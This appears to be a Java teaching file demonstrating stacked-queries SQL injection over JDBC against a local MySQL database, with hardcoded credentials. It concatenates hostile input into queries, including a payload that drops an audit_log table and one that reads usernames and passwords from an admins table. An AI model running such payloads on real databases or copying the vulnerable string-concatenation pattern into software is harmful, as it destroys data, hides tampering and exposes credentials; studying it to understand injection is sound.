// Stacked Queries SQL Injection via JDBC
// Attacker runs multiple separate statements by chaining them with a semicolon.

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class stacked_queries_injection {
    public static void main(String[] args) throws Exception {
        String url = "jdbc:mysql://localhost:3306/database_name";
        String username = "rootgfg";
        String password = "gfg123";

        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection con = DriverManager.getConnection(url, username, password);
        Statement st = con.createStatement();

        // VULNERABLE: stacked statements appended to legitimate input
        String input = "1; DROP TABLE audit_log; --";
        String query = "SELECT * FROM users WHERE id = " + input;

        try {
            st.execute(query);
            System.out.println("Query executed; stacked DROP TABLE ran too");
        } catch (Exception e) {
            System.out.println("Multi-statements rejected by this driver: " + e.getMessage());
        }

        // Stacked data read
        String stacked = "1; SELECT username, password FROM admins; --";
        try {
            boolean hasMore = st.execute("SELECT id FROM users WHERE id = " + stacked);
            if (hasMore) {
                ResultSet rs = st.getResultSet();
                while (rs.next()) {
                    System.out.println("User id: " + rs.getInt(1));
                }
            }
        } catch (Exception e) {
            System.out.println("Stacked read blocked: " + e.getMessage());
        }

        st.close();
        con.close();
    }
}
